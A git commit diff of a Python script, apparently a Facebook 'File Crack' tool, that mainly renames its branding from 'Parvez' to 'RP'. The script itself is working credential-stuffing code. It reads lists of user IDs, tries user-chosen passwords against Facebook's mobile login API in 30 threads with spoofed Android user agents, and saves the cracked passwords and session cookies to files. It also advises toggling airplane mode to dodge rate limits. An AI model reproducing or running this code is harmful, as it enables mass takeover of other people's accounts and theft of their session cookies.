76809710f34124af2b546b8ec4774014ba40362d
Parvez Ahmef <134613767+Parvez36397098@users.noreply.github.com>
2023-08-26 12:01:30 +0600

    Add files via upload

--- PARVEZ.py
+++ PARVEZ.py
@@ -1,25 +1,25 @@
 #!/usr/bin/python
-#Original written By Parvez Ahmed
+#Original written By Riyad Mahfuz
 
 import os,zlib
 
 from os import system as osRUB
 from os import system as cmd
 os.system('clear')
-print('\033[92;1m★ \033[1;37m Installing missing modules ...')
+print('\033[92;1m~ \033[1;37m Installing missing modules ...')
 os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests bs4')
 
 try:
     import requests 
 except ImportError:
-    print('\n\033[92;1m★ \033[1;37m  installing Requests ...\n')
+    print('\n\033[92;1m~ \033[1;37m  installing Requests ...\n')
     os.system('pip install requests')
 
 
 try:
     import concurrent.futures
 except ImportError:
-    print('\n\033[92;1m★ \033[1;37m  installing futures ...\n')
+    print('\n\033[92;1m~ \033[1;37m  installing futures ...\n')
     os.system('pip install futures')
 
 try:
@@ -29,7 +29,7 @@ except ModuleNotFoundError:
 
 from urllib.request import Request, urlopen
 import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
-from concurrent.futures import ThreadPoolExecutor as Parvezssb
+from concurrent.futures import ThreadPoolExecutor as RPssb
 from string import * 
 from random import randint
 from time import sleep as slp
@@ -62,13 +62,13 @@ filter = []
 def randBuildLSB():
     vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
     VAPP = random.randint(410000000,499999999)
-    END = '[FBAN/FB4A:FBAV/264.0.0.21.147;FBPN/com.facebook.katana;FBLC/in_ID:FBBV/6528762;FBCR/ONIC FBMF/OPPO,FBB D/OPPO,FBDV/CPH1607;FBSV/12;FBCA /armeabi-v7a:armeabi;FBDM/(density-3.0,width=720,height=1520);FB_FW/1]'
-    ua = f'FBAN/FB4A: (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
+    END = '[FBAN/FB4A;FBAV/355.0.0.37.106;FBPN/com.facebook.katana;FBLC/in_ID;FBBV/13543083;FBCR/Telenor;FBMF/OPPO;FBBD/OPPO;FBDV/CPH2325;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=720,height=1520};FB_FW/1;]'
+    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
     return ua
 
 #______m1_______
 
-def xdm1():
+def RPm1():
     END = '[FBAN/FB4A;FBAV/355.0.0.37.106;FBPN/com.facebook.katana;FBLC/in_ID;FBBV/13543083;FBCR/Telenor;FBMF/OPPO;FBBD/OPPO;FBDV/CPH2325;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=720,height=1520};FB_FW/1;]'
     ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
     return ua
@@ -81,7 +81,7 @@ def randBuildvsskj():
     return ua
 
 
-sys.stdout.write('\x1b]2; Parvez\x07')
+sys.stdout.write('\x1b]2; RP\x07')
 S = '\033[1;37m'
 A = '\x1b[38;5;208m'
 R = '\x1b[38;5;46m'
@@ -89,22 +89,22 @@ F = '\x1b[38;5;48m'
 Z = '\033[1;33m'
 head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
 
-try:os.mkdir('/sdcard/Parvez')
+try:os.mkdir('/sdcard/RP')
 except:pass
 
 
 logo ="""\033[1;37m
 \033[1;32m██████   █████  ██████  ██    ██ ███████ ███████
-\033[91;1m██   ██ ██   ██ ██   ██ ██    ██ ██         ███ 
+\033[1;32m██   ██ ██   ██ ██   ██ ██    ██ ██         ███ 
 \033[1;32m██████  ███████ ██████  ██    ██ █████     ███
-\033[91;1m██      ██   ██ ██   ██  ██  ██  ██       ███ 
-\033[1;32m██      ██   ██ ██   ██   ████   ███████ ███████' \033[92;1mP \033[1;37mA \033[92;1mR \033[1;37mV \033[92;1mE \033[92;1mZ
+\033[1;32m██      ██   ██ ██   ██  ██  ██  ██       ███ 
+\033[1;32m██      ██   ██ ██   ██   ████   ███████ ███████' \033[1;32mP \033[1;33mA \033[1;34mR \033[1;35mV \033[1;36mE \033[1;37mZ
 \033[1;32m--------------------------------------------------------
-\033[1;37m[\033[1;37m•\033[1;37m]\033[1;37m  DEVELOPER    :   PARVEZ AHMED
-\033[1;37m[\033[1;37m•\033[1;37m]\033[1;37m  TOOLS        :   FILE/RANDOM clone
-\033[1;37m[\033[1;37m•\033[1;37m]\033[1;37m  VERSION      :   1.0
-\033[1;37m[\033[1;37m•\033[1;37m]\033[1;37m  WORKING      :   DATA/WIFI
-\033[1;37m[\033[1;37m•\033[1;37m]\033[1;37m  WHATSAPP     :   8801751581953
+\033[1;37m[\033[1;31m•\033[1;37m]\033[1;31m  DEVELOPER    :   \033[1;31mPARVEZ AHMED
+\033[1;37m[\033[1;32m•\033[1;37m]\033[1;32m  TOOLS        :   \033[1;32mFILE/RANDOM clone
+\033[1;37m[\033[1;33m•\033[1;37m]\033[1;33m  VERSION      :   \033[1;33m1.0
+\033[1;37m[\033[1;34m•\033[1;37m]\033[1;34m  WORKING      :   \033[1;34mDATA/WIFI
+\033[1;37m[\033[1;35m•\033[1;37m]\033[1;35m  WHATSAPP     :   \033[1;35m8801751581953
 \033[1;32m------------------------------------------------------"""
 def linex():
         print(f"\033[1;32m-------------------------------------------------------""")
@@ -116,23 +116,52 @@ def result(OKs,cps):
     if len(OKs) != 0 or len(cps) != 0:
         print('\n')
         linex()
-        print('\033[92;1m★\033[1;37m The Process has been Complete')
+        print('\033[92;1m~\033[1;37m The Process has been Complete')
         linex()
-        print('\033[92;1m★\033[1;37m TOTAL OK:\033[92;1m %s' % str(len(oks)))
-        print('\033[92;1m★\033[1;37m TOTAL CP:\033[92;1m %s' % str(len(cps)))
+        print('\033[92;1m~\033[1;37m TOTAL OK:\033[92;1m %s' % str(len(oks)))
+        print('\033[92;1m~\033[1;37m TOTAL CP:\033[92;1m %s' % str(len(cps)))
         linex()
-        input("Press enter to back Parvez Menu ")
+        input("Press enter to back RP Menu ")
         exit()
 
 
-def Parvez():   
+
+#_________________________________________________________________________
+    #print(f'[2] Public ID Crack')
+    #print(f'[3] Random Crack ')
+    #print(f'[4] Create File')
+    #print(f'[5] Login Tool')
+    #print(f'[6] Logout Cookie')
+    #print(f'[7] Remove Trash Files ')
+    #print(f'[8] Separate Ids')
+    #print(f'[9] Remove Duplicate IDs')
+#____________________________________________________________________________
+   #elif select =='2':
+        #exit(' This is Option Soon available ... ')
+    #elif select =='3':
+        #random_number()
+    #elif select =='4':
+       #menu()
+    #elif select =='5':
+       #login()
+    #elif select =='6':
+       #remove_Tc()
+    #elif select =='7':
+       #removef()
+    #elif select =='8':
+       #sids()
+    #elif select =='9':
+       #cutter()s
+#________________________________________________________________________________
+
+def RP():   
     os.system('clear')
     print(logo)
     print(f'\033[92;1m[\033[1;37m1\033[92;1m] \033[1;37mFile Crack')
-    print(f'\033[92;1m[\033[1;37m2\033[92;1m] \033[1;37mLike Facebook Page ')
+    print(f'\033[92;1m[\033[1;37m2\033[92;1m] \033[1;37mJoin Facebook Group ')
     print(f'\033[92;1m[\033[1;37m3\033[92;1m] \033[1;37mJoin Facebook Profile ')
     linex()
-    select = input('\033[92;1m★\033[1;37m Choice :\033[92;1m ')
+    select = input('\033[92;1m~\033[1;37m Choice :\033[92;1m ')
     if select =='1':
         method_crack()
  
@@ -140,10 +169,10 @@ def Parvez():
 
 
     elif select =='2':
-        os.system('xdg-open https://www.facebook.com/rp.parvez075/')
+        os.system('RPg-open https://www.facebook.com/groups/344131704494239/')
         pass
     elif select =='3':
-        os.system('xdg-open https://www.facebook.com/rp.parvez075/')
+        os.system('RPg-open https://www.facebook.com/RP.RP/')
     else:
         print('\n\033[1;91m Select valid option ... ')
         time.sleep(2)
@@ -157,7 +186,7 @@ def method_crack():
     print(f'\033[92;1m[\033[1;37m3\033[92;1m] \033[1;37mMethod')
     print(f'\033[92;1m[\033[1;37m0\033[92;1m] \033[91;1mBack')
     linex()
-    option = input('\033[92;1m★\033[1;37m Choice :\033[92;1m ')
+    option = input('\033[92;1m~\033[1;37m Choice :\033[92;1m ')
     if option =='1':
         methods.append('methodA')
         main_crack().crack(id)
@@ -168,7 +197,7 @@ def method_crack():
         methods.append('methodC')
         main_crack().crack(id)
     elif option =='0':
-        Parvez()
+        RP()
     else:
       print('\n\033[91;1mSelect Valid Option ...')
       time.sleep(2)
@@ -180,9 +209,9 @@ class main_crack():
     def crack(self,id):
         global methods
         clear()
-        print('\033[92;1m★ \033[1;37mPut file example:\033[92;1m /sdcard/File.txt  etc..')
+        print('\033[92;1m~ \033[1;37mPut file example:\033[92;1m /sdcard/File.txt  etc..')
         linex()
-        self.file = input('\033[92;1m★ \033[1;37mPut file path:\033[92;1m ')
+        self.file = input('\033[92;1m~ \033[1;37mPut file path:\033[92;1m ')
         try:
             self.id = open(self.file).read().splitlines()
             self.pasw()
@@ -191,7 +220,7 @@ class main_crack():
             time.sleep(2)
             os.system('clear')
             print(logo)
-            print('\033[92;1m★ \033[1;37mTry Again')
+            print('\033[92;1m~ \033[1;37mTry Again')
             time.sleep(2)
             main_crack().crack(id)
 
@@ -203,7 +232,7 @@ class main_crack():
     def methodA(self, sid, name, psw):
         try:
             global oks,cps,loop
-            sys.stdout.write(f"\r \033[1;34mP\033[1;37mA\033[1;34mR\033[1;37mV\033[1;34mEZ\033[1;37m-\033[1;32mx\033[1;32md \033[1;37m\x1b[1;94m{loop} \033[1;37m★ \033[1;32mOK \033[1;37m★\033[1;32m {len(oks)} \033[1;91mCP \033[1;37m★\033[1;91m {len(cps)}")
+            sys.stdout.write(f"\r \033[1;34mFinding \033[1;32mOK \033[1;37m~\033[1;32m {len(oks)} \033[1;91mCP \033[1;37m~\033[1;91m {len(cps)}")
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -234,7 +263,7 @@ class main_crack():
 "fb_api_req_friendly_name": "authenticate",
 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
 "api_key": "882a8490361da98702bf97a021ddc14d"}
-                headers = {'User-Agent': xdm1(),
+                headers = {'User-Agent': RPm1(),
 'Content-Type': 'application/x-www-form-urlencoded',
 'Host': 'graph.facebook.com',
 'X-FB-Net-HNI': str(random.randint(20000, 40000)),
@@ -252,14 +281,14 @@ class main_crack():
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
-                    print(f"\r\033[1;32m [XD]-[OK] {sid} | {ps} {S}")
+                    print(f"\r\033[1;32m [RP]-[OK] {sid} | {ps} {S}")
                     oks.append(sid)
-                    open('/sdcard/Parvez/OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Parvez/iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    open('/sdcard/RP/OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/RP/iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                     print(f"\r\033[91;1m [XD]-[CP] {sid} | {ps} {S}")
+                     print(f"\r\033[91;1m [RP]-[CP] {sid} | {ps} {S}")
                      cps.append(sid)
-                     open('/sdcard/Parvez/CP.txt','a').write(sid+'|'+ps+'\n')
+                     open('/sdcard/RP/CP.txt','a').write(sid+'|'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -274,7 +303,7 @@ class main_crack():
     def methodC(self, sid, name, psw):
         try:
             global oks,cps,loop
-            sys.stdout.write(f"\r \033[1;34mP\033[1;37mA\033[1;34mR\033[1;37mV\033[1;34mEZ\033[1;37m-\033[1;32mX\033[1;32mD \033[1;37m\x1b[1;94m{loop} \033[1;37m★ \033[1;32mOK \033[1;37m★\033[1;32m {len(oks)} \033[1;91mCP \033[1;37m★\033[1;91m {len(cps)}")
+            sys.stdout.write(f"\r \033[1;34mFinding \033[1;32mOK \033[1;37m~\033[1;32m {len(oks)} \033[1;91mCP \033[1;37m~\033[1;91m {len(cps)}")
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -323,14 +352,14 @@ class main_crack():
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
-                    print(f"\r\033[1;32m [XD]-[OK] {sid} | {ps} {S}")
+                    print(f"\r\033[1;32m [RP]-[OK] {sid} | {ps} {S}")
                     oks.append(sid)
-                    open('/sdcard/Parvez/OK-M3.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Parvez/iDs-COOKiEs-M3.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    open('/sdcard/RP/OK-M3.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/RP/iDs-COOKiEs-M3.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                      print(f"\r\033[91;1m [XD]-[CP] {sid} | {ps} {S}")
+                      print(f"\r\033[91;1m [RP]-[CP] {sid} | {ps} {S}")
                       cps.append(sid)
-                      open('/sdcard/Parvez/CP.txt','a').write(sid+'|'+ps+'\n')
+                      open('/sdcard/RP/CP.txt','a').write(sid+'|'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -346,7 +375,7 @@ class main_crack():
     def methodB(self, sid, name, psw):
         try:
             global oks,cps,loop
-            sys.stdout.write(f"\r \033[1;34mP\033[1;37mA\033[1;34mR\033[1;37mV\033[1;34mEZ\033[1;37m-\033[1;32mX\033[1;32mD \033[1;37m\x1b[1;94m{loop} \033[1;37m★ \033[1;32mOK \033[1;37m★\033[1;32m {len(oks)} \033[1;91mCP \033[1;37m★\033[1;91m {len(cps)}")
+            sys.stdout.write(f"\r \033[1;34mFinding \033[1;32mOK \033[1;37m~\033[1;32m {len(oks)} \033[1;91mCP \033[1;37m~\033[1;91m {len(cps)}")
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -395,15 +424,15 @@ class main_crack():
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
-                    print(f"\r\033[1;32m [XD]-[OK] {sid} | {ps} {S}")
-                    print("\r\r\033[1;34m[💥\033[1;34m]\033[1;32m :\033[1;37m "+cookie)
+                    print(f"\r\033[1;32m [RP]-[OK] {sid} | {ps} {S}")
+                    print("\r\r\033[1;34m[❤️‍🩹\033[1;34m]\033[1;32m :\033[1;37m "+cookie)
                     oks.append(sid)
-                    open('/sdcard/Parvez/OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Parvez/iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    open('/sdcard/RP/OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/RP/iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                      print(f"\r\033[91;1m [XD]-[CP] {sid} | {ps} {S}")
+                      print(f"\r\033[91;1m [RP]-[CP] {sid} | {ps} {S}")
                       cps.append(sid)
-                      open('/sdcard/Parvez/CP.txt','a').write(sid+'|'+ps+'\n')
+                      open('/sdcard/RP/CP.txt','a').write(sid+'|'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -417,30 +446,30 @@ class main_crack():
     def pasw(self):       
             pw = []
             clear()
-            print('\033[92;1m★ \033[1;37mPut limit between 1 \033[92;1m★\033[1;37m 30')
+            print('\033[92;1m~ \033[1;37mPut limit between 1 \033[92;1m~\033[1;37m 30')
             linex()
-            sl = int(input('\033[92;1m★ \033[1;37mPasswordLimit \033[91;1m?\033[92;1m '))
+            sl = int(input('\033[92;1m~ \033[1;37mHow many passwords do you want to add \033[91;1m?\033[92;1m '))
             os.system("clear")
             print(logo)
-            print(f'\033[92;1m★ \033[1;37mEXAMPLE :\033[92;1mfirst last,first123,First@123…\033[1;37mEtc')
+            print(f'\033[92;1m~ \033[1;37mEXAMPLE :\033[92;1mfirst last,first123,First@123…\033[1;37mEtc')
             linex()
             if sl =='':
-                print('\n\033[92;1m★ \033[1;37Put limit 1 to 30')
+                print('\n\033[92;1m~ \033[1;37Put limit 1 to 30')
             elif sl > 20:
                 print('\n\033[91\;1mPassword limit Should Not Be Greater Than 30')
             else:
                 for sr in range(sl):
-                    pw.append(input(f'\033[92;1m★ \033[1;37m password {sr+1}:\033[92;1m '))
+                    pw.append(input(f'\033[92;1m~ \033[1;37m password {sr+1}:\033[92;1m '))
                     print(f"\33[1;37m-------------------------------------------------------""")
             os.system("clear")
             print(logo)
             
-            #print(f'\033[92;1m★ \033[1;37m Cracking Started')
+            #print(f'\033[92;1m~ \033[1;37m Cracking Started')
             #linex()
-            print(f'\033[92;1m★ \033[1;37m Total IDs :\033[92;1m %s ' % len(self.id))
-            print(f"\r\033[92;1m★ \33[1;97m Every 5 Min Turn Airplane\x1b[91;1m > On/Off\33[1;37m")
+            print(f'\033[92;1m~ \033[1;37m Total IDs :\033[92;1m %s ' % len(self.id))
+            print(f"\r\033[92;1m~ \33[1;97m Every 5 Min Turn Airplane\x1b[91;1m > On/Off\33[1;37m")
             linex()
-            with Parvezssb(max_workers=30) as ssbworld:
+            with RPssb(max_workers=30) as ssbworld:
                 for zsb in self.id:
                    try:
                        uid, name = zsb.split('|')
@@ -463,4 +492,4 @@ class main_crack():
 
 
 
-Parvez()
+RP()
